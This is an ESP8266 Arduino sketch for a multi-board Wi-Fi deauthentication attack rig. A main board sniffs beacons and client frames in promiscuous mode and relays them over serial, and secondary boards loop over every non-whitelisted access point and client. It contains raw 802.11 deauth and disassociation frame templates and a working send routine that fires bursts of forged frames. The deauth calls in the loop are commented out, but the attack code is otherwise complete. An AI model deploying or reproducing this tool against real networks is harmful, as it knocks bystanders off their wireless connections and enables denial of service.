// Expose Espressif SDK functionality - wrapped in ifdef so that it still
// compiles on other platforms
#ifdef ESP8266
extern "C" {
#include "user_interface.h"
}
#endif

#include <ESP8266WiFi.h>

#define ETH_MAC_LEN 6
#define MAX_APS_TRACKED 100
#define MAX_CLIENTS_TRACKED 200

// Put Your devices here, system will skip them on deauth
#define WHITELIST_LENGTH 2
uint8_t whitelist[WHITELIST_LENGTH][ETH_MAC_LEN] = { { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF }, {  0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC } };

// Declare to whitelist STATIONs ONLY, otherwise STATIONs and APs can be whitelisted
// If AP is whitelisted, all its clients become automatically whitelisted
//#define WHITELIST_STATION 

// Channel to perform deauth
uint8_t channel = 0;

// Packet buffer
uint8_t packet_buffer[64];

// DeAuth template
uint8_t template_dauth[26] = {0xc0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x00, 0x00, 0x01, 0x00};
uint8_t template_dasso[26] = {0xa0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x00, 0x00, 0x01, 0x00};

uint8_t broadcast1[3] = { 0x01, 0x00, 0x5e };
uint8_t broadcast2[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
uint8_t broadcast3[3] = { 0x33, 0x33, 0x00 };

struct beaconinfo //Info about beacon sent by AP. Need on both Primary and Secondary.
{
  uint8_t bssid[ETH_MAC_LEN];
  uint8_t ssid[33];
  int ssid_len;
  int channel;
  int err;
  signed rssi;
  uint8_t capa[2];
};

struct clientinfo //Info about client that is connected. Need on both Primary and Secondary.
{
  uint8_t bssid[ETH_MAC_LEN];
  uint8_t station[ETH_MAC_LEN];
  uint8_t ap[ETH_MAC_LEN];
  int channel;
  int err;
  signed rssi;
  uint16_t seq_n;
};

beaconinfo aps_known[MAX_APS_TRACKED];                    // Array to save MACs of known APs.
int aps_known_count = 0;                                  // Number of known APs
int nothing_new = 0;
clientinfo clients_known[MAX_CLIENTS_TRACKED];            // Array to save MACs of known CLIENTs
int clients_known_count = 0;                              // Number of known CLIENTs

bool friendly_device_found = false;
uint8_t *address_to_check;

bool main = false;

struct beaconinfo parse_beacon(uint8_t *frame, uint16_t framelen, signed rssi) //Parses frame and returns a beacon struct.
{
  struct beaconinfo bi;
  bi.ssid_len = 0;
  bi.channel = 0;
  bi.err = 0;
  bi.rssi = rssi;
  int pos = 36;

  if (frame[pos] == 0x00) {
    while (pos < framelen) {
      switch (frame[pos]) {
        case 0x00: //SSID
          bi.ssid_len = (int) frame[pos + 1];
          if (bi.ssid_len == 0) {
            memset(bi.ssid, '\x00', 33);
            break;
          }
          if (bi.ssid_len < 0) {
            bi.err = -1;
            break;
          }
          if (bi.ssid_len > 32) {
            bi.err = -2;
            break;
          }
          memset(bi.ssid, '\x00', 33);
          memcpy(bi.ssid, frame + pos + 2, bi.ssid_len);
          bi.err = 0;  // before was error??
          break;
        case 0x03: //Channel
          bi.channel = (int) frame[pos + 2];
          pos = -1;
          break;
        default:
          break;
      }
      if (pos < 0) break;
      pos += (int) frame[pos + 1] + 2;
    }
  } else {
    bi.err = -3;
  }

  bi.capa[0] = frame[34];
  bi.capa[1] = frame[35];
  memcpy(bi.bssid, frame + 10, ETH_MAC_LEN);

  return bi;
}

struct clientinfo parse_data(uint8_t *frame, uint16_t framelen, signed rssi, unsigned channel) //Parses frame and returns a clientinfo struct.
{
  struct clientinfo ci;
  ci.channel = channel;
  ci.err = 0;
  ci.rssi = rssi;
  int pos = 36;
  uint8_t *bssid;
  uint8_t *station;
  uint8_t *ap;
  uint8_t ds;

  ds = frame[1] & 3;    //Set first 6 bits to 0
  switch (ds) {
    // p[1] - xxxx xx00 => NoDS   p[4]-DST p[10]-SRC p[16]-BSS
    case 0:
      bssid = frame + 16;
      station = frame + 10;
      ap = frame + 4;
      break;
    // p[1] - xxxx xx01 => ToDS   p[4]-BSS p[10]-SRC p[16]-DST
    case 1:
      bssid = frame + 4;
      station = frame + 10;
      ap = frame + 16;
      break;
    // p[1] - xxxx xx10 => FromDS p[4]-DST p[10]-BSS p[16]-SRC
    case 2:
      bssid = frame + 10;
      // hack - don't know why it works like this...
      if (memcmp(frame + 4, broadcast1, 3) || memcmp(frame + 4, broadcast2, 3) || memcmp(frame + 4, broadcast3, 3)) {
        station = frame + 16;
        ap = frame + 4;
      } else {
        station = frame + 4;
        ap = frame + 16;
      }
      break;
    // p[1] - xxxx xx11 => WDS    p[4]-RCV p[10]-TRM p[16]-DST p[26]-SRC
    case 3:
      bssid = frame + 10;
      station = frame + 4;
      ap = frame + 4;
      break;
  }

  memcpy(ci.station, station, ETH_MAC_LEN);
  memcpy(ci.bssid, bssid, ETH_MAC_LEN);
  memcpy(ci.ap, ap, ETH_MAC_LEN);

  ci.seq_n = frame[23] * 0xFF + (frame[22] & 0xF0);

  return ci;
}

bool register_beacon(beaconinfo beacon) //adds an AP to the list of known APs. Could point this to secondary.
{
  int known = false;   // Clear known flag
  for (int u = 0; u < aps_known_count; u++)
  {
    if (! memcmp(aps_known[u].bssid, beacon.bssid, ETH_MAC_LEN)) 
    {
      known = true;
      break;
    }   // AP known => Set known flag
  }
  if (! known)  // AP is NEW, copy MAC to array and return it
  {
    memcpy(&aps_known[aps_known_count], &beacon, sizeof(beacon));
    aps_known_count++;

    if ((unsigned int) aps_known_count >= sizeof (aps_known) / sizeof (aps_known[0]) ) 
    {
      Serial.printf("exceeded max aps_known\n");
      aps_known_count = 0;
    }
  }
  return known;
}

bool register_client(clientinfo ci) //adds a client to the list of clients. Could point this to secondary.
{
  int known = false;   // Clear known flag
  for (int u = 0; u < clients_known_count; u++)
  {
    if (! memcmp(clients_known[u].station, ci.station, ETH_MAC_LEN)) 
    {
      known = true;
      break;
    }
  }
  if (! known)
  {
    memcpy(&clients_known[clients_known_count], &ci, sizeof(ci));
    clients_known_count++;

    if ((unsigned int) clients_known_count >= sizeof (clients_known) / sizeof (clients_known[0]) ) 
    {
      Serial.printf("exceeded max clients_known\n");
      clients_known_count = 0;
    }
  }
  return known;
}

void print_beacon(beaconinfo beacon) //prints beacon info to serial. Do not need.
{
  if (beacon.err != 0) 
  {
    //Serial.printf("BEACON ERR: (%d)  ", beacon.err);
  } 
  else 
  {
    Serial.printf("BEACON: [%32s]  ", beacon.ssid);
    for (int i = 0; i < 6; i++) Serial.printf("%02x", beacon.bssid[i]);
    Serial.printf("   %2d", beacon.channel);
    Serial.printf("   %4d\r\n", beacon.rssi);
  }
}

void print_client(clientinfo ci) //prints client info to serial. Do not need.
{
  int u = 0;
  int known = 0;   // Clear known flag
  if (ci.err != 0) 
  {
  } 
  else 
  {
    Serial.printf("CLIENT: ");
    for (int i = 0; i < 6; i++) Serial.printf("%02x", ci.station[i]);
    Serial.printf(" works with: ");
    for (u = 0; u < aps_known_count; u++)
    {
      if (! memcmp(aps_known[u].bssid, ci.bssid, ETH_MAC_LEN)) 
      {
        Serial.printf("[%32s]", aps_known[u].ssid);
        known = 1;
        break;
      }   // AP known => Set known flag
    }
    if (! known)  
    {
      Serial.printf("%22s", " ");
      for (int i = 0; i < 6; i++) Serial.printf("%02x", ci.bssid[i]);
    }

    Serial.printf("%5s", " ");
    for (int i = 0; i < 6; i++) Serial.printf("%02x", ci.ap[i]);
    Serial.printf("%5s", " ");

    if (! known) 
    {
      Serial.printf("   %3d", ci.channel);
    } 
    else 
    {
      Serial.printf("   %3d", aps_known[u].channel);
    }
    Serial.printf("   %4d\r\n", ci.rssi);
  }
}

/* ==============================================
   Promiscous callback structures, see ESP manual
   ============================================== */

struct RxControl {
  signed rssi: 8;
  unsigned rate: 4;
  unsigned is_group: 1;
  unsigned: 1;
  unsigned sig_mode: 2;
  unsigned legacy_length: 12;
  unsigned damatch0: 1;
  unsigned damatch1: 1;
  unsigned bssidmatch0: 1;
  unsigned bssidmatch1: 1;
  unsigned MCS: 7;
  unsigned CWB: 1;
  unsigned HT_length: 16;
  unsigned Smoothing: 1;
  unsigned Not_Sounding: 1;
  unsigned: 1;
  unsigned Aggregation: 1;
  unsigned STBC: 2;
  unsigned FEC_CODING: 1;
  unsigned SGI: 1;
  unsigned rxend_state: 8;
  unsigned ampdu_cnt: 8;
  unsigned channel: 4;
  unsigned: 12;
};

struct LenSeq {
  uint16_t length;
  uint16_t seq;
  uint8_t  address3[6];
};

struct sniffer_buf {
  struct RxControl rx_ctrl;
  uint8_t buf[36];
  uint16_t cnt;
  struct LenSeq lenseq[1];
};

struct sniffer_buf2 {
  struct RxControl rx_ctrl;
  uint8_t buf[112];
  uint16_t cnt;
  uint16_t len;
};


/* Creates a packet.
   buf - reference to the data array to write packet to;
   client - MAC address of the client;
   ap - MAC address of the acces point;
   seq - sequence number of 802.11 packet;
   Returns: size of the packet
*/
uint16_t create_packet(uint8_t *buf, uint8_t *c, uint8_t *ap, uint16_t seq, bool deassociate_flag) //Creates a packet, probably only need on secondary.
{
  int i = 0;
  if(deassociate_flag)
  {
      memcpy(buf, template_dasso, 26);
  }
  else
  {
      memcpy(buf, template_dauth, 26);
  }
  // Destination
  memcpy(buf + 4, c, ETH_MAC_LEN);
  // Sender
  memcpy(buf + 10, ap, ETH_MAC_LEN);
  // BSS
  memcpy(buf + 16, ap, ETH_MAC_LEN);
  // Seq_n
  buf[22] = seq % 0xFF;
  buf[23] = seq / 0xFF;

  return 26;
}

/* Sends deauth packets. */
void deauth(uint8_t *c, uint8_t *ap, uint16_t seq) //Does the deauthentication. Can move to secondary.
{
  uint8_t i = 0;
  uint16_t sz = 0;
  for (i = 0; i < 0x10; i++) 
  {
    sz = create_packet(packet_buffer, c, ap, seq + 0x10 * i, false);
    wifi_send_pkt_freedom(packet_buffer, sz, 0);
    delay(1);
    sz = create_packet(packet_buffer, c, ap, seq + 0x10 * i, true);
    wifi_send_pkt_freedom(packet_buffer, sz, 0);
    delay(1);
  }
}

void send_data(int state, struct beaconinfo beacon, struct clientinfo client) //Sends data to the secondary
{
    char terminator = (char)255;
    Serial.write(state);
    if(state==65)
    {
      digitalWrite(5,HIGH);
    }
    else if(state==66)
    {
      Serial.write(client.bssid,ETH_MAC_LEN);
      Serial.write(client.station,ETH_MAC_LEN);
      Serial.write(client.ap,ETH_MAC_LEN);
      Serial.write(client.channel);
      Serial.write(client.err);
      Serial.write(client.rssi);
      Serial.write(client.seq_n);
    }
    else if(state==67)
    {
      Serial.write(beacon.bssid,ETH_MAC_LEN);
      Serial.write(beacon.ssid_len);
      Serial.write(beacon.ssid,beacon.ssid_len);
      Serial.write(beacon.channel);
      Serial.write(beacon.err);
      Serial.write(beacon.rssi);
      Serial.write(beacon.capa,2);
    }
    Serial.write(terminator);
    Serial.flush();
    delay(100);
    digitalWrite(5,LOW);
}

void recv_data()
{
  char throwawayBuffer[64];
  char terminator = (char)255;
  struct beaconinfo recievedBeacon;
  struct clientinfo recievedClient;

  int cycleCount = 50;
  int knownLimit = 10;

  int knownClientCount = 0;
  int knownBeaconCount = 0;
  
  for(int i=0;i<cycleCount;i++)
  {
    if(Serial.available())
    {
      int state = -1;
      state = Serial.read();
      //Serial.print(state,DEC);
      //Serial.print("\n");
      if((state>=65)&&(state<=67))
      {
        if(state==65)
        {
          digitalWrite(5,HIGH);
          yield();
        }
        else if (state==66)
        { 
          digitalWrite(5,HIGH);     
          for(int i=0;i<ETH_MAC_LEN;i++)
          {
            recievedClient.bssid[i] = Serial.read();
          }
          for(int i=0;i<ETH_MAC_LEN;i++)
          {
            recievedClient.station[i] = Serial.read();
          }
          for(int i=0;i<ETH_MAC_LEN;i++)
          {
            recievedClient.ap[i] = Serial.read();
          }
          recievedClient.channel = Serial.read();
          recievedClient.err = Serial.read();
          recievedClient.rssi = Serial.read();
          recievedClient.seq_n = Serial.read();
    
          if (register_client(recievedClient))
          {
            knownClientCount++;
          }
          else
          {
            //print_client(recievedClient);
            knownClientCount=0;
          }
          yield(); 
        }
        else if (state==67)
        { 
          digitalWrite(5,HIGH);
          for(int i=0;i<ETH_MAC_LEN;i++)
          {
            recievedBeacon.bssid[i] = Serial.read();
          } 
          
          recievedBeacon.ssid_len = Serial.read();
    
          for(int i=0;i<recievedBeacon.ssid_len;i++)
          {
            recievedBeacon.ssid[i] = Serial.read();
          }
          recievedBeacon.ssid[recievedBeacon.ssid_len]=0;
          
          recievedBeacon.channel = Serial.read();
          recievedBeacon.err = Serial.read();
          recievedBeacon.rssi = Serial.read();
          recievedBeacon.capa[0] = Serial.read();
          recievedBeacon.capa[1] = Serial.read();
    
          if (register_beacon(recievedBeacon))
          {
            knownBeaconCount++;
          }
          else
          {
            //print_beacon(recievedBeacon);
            knownBeaconCount=0;
          }
          yield();
        }
        Serial.readBytesUntil(terminator,throwawayBuffer,64);
        yield();
      }
      else
      {
        Serial.readBytesUntil(terminator,throwawayBuffer,64);
        yield(); 
      }
    }
    yield();
    delay(10);

    if( (knownClientCount > knownLimit) || (knownBeaconCount > knownLimit) )
    {
      Serial.print("----KNOWNEXIT----\n");
      break;  
    }
  }
  Serial.print("----EXITFOR----\n");   
  digitalWrite(5,LOW);
}

void promisc_cb(uint8_t *buf, uint16_t len) //Promiscuous callback function, this does the actual sniffing and parsing of data.
{
  digitalWrite(5,LOW);
  
  int i = 0;
  uint16_t seq_n_new = 0;
  struct beaconinfo dummyBeacon;
  struct clientinfo dummyClient;
  if (len == 12) 
  {
    struct RxControl *sniffer = (struct RxControl*) buf;
    send_data(65, dummyBeacon, dummyClient);
  } 
  else if (len == 128) 
  {
    struct sniffer_buf2 *sniffer = (struct sniffer_buf2*) buf;
    struct beaconinfo beacon = parse_beacon(sniffer->buf, 112, sniffer->rx_ctrl.rssi);
    send_data(67, beacon, dummyClient);
  } 
  else 
  {
    struct sniffer_buf *sniffer = (struct sniffer_buf*) buf;
    //Is data or QOS?
    if ((sniffer->buf[0] == 0x08) || (sniffer->buf[0] == 0x88)) 
    {
      struct clientinfo ci = parse_data(sniffer->buf, 36, sniffer->rx_ctrl.rssi, sniffer->rx_ctrl.channel);
      if (memcmp(ci.bssid, ci.station, ETH_MAC_LEN)) 
      {
        send_data(66, dummyBeacon, ci);
      }
    }
  }

  digitalWrite(5,HIGH);
}

bool check_whitelist(uint8_t *macAdress) //Whitelisting system. Can move to secondary.
{
  unsigned int i=0;
  for (i=0; i<WHITELIST_LENGTH; i++) 
  {
    if (! memcmp(macAdress, whitelist[i], ETH_MAC_LEN)) return true;
  }
  return false;
}

void deauth_loop()
{
  for(int i=0;i<clients_known_count;i++)
  {
    if(!check_whitelist(clients_known[i].station) || !check_whitelist(clients_known[i].bssid))
    {
      print_client(clients_known[i]);
      Serial.print("\n");
      //deauth(clients_known[i].station,clients_known[i].bssid,clients_known[i].seq_n);
    }
    delay(1);
  }
  yield();
  for(int i=0;i<aps_known_count;i++)
  {
    if(!check_whitelist(aps_known[i].bssid))
    {
      print_beacon(aps_known[i]);
      Serial.print("\n");
      //deauth(broadcast2, aps_known[i].bssid, 128);
    }
    delay(1);
  }
  yield();
}

void setup() {
  pinMode(5, OUTPUT); //Live LED
  
  pinMode(4, INPUT); //Main jumper
  pinMode(13, INPUT); //1 jumper
  pinMode(12, INPUT); //2 jumper
  pinMode(14, INPUT); //4 jumper
  pinMode(16, INPUT); //8 jumper

  if(digitalRead(4) == LOW) //Is main?
    main = true;
  if(digitalRead(13) == LOW)
    channel=channel+1;
  if(digitalRead(12) == LOW)
    channel=channel+2;
  if(digitalRead(14) == LOW)
    channel=channel+4;
  if(digitalRead(16) == LOW)
    channel=channel+8;

  Serial.begin(9600);
  //Serial.printf("\n\nSDK version:%s\n", system_get_sdk_version());

  // Promiscuous works only with station mode
  wifi_set_opmode(STATION_MODE);
  wifi_set_channel(channel);
  if(main)
  {
    wifi_promiscuous_enable(0);
    wifi_set_promiscuous_rx_cb(promisc_cb);
    wifi_promiscuous_enable(1);
  }
  else
  {
    wifi_promiscuous_enable(1);
  }
}

void loop() 
{  
  if(main)
  {
    //do nothing
  }
  else
  {
    recv_data();
    deauth_loop();
  }
}
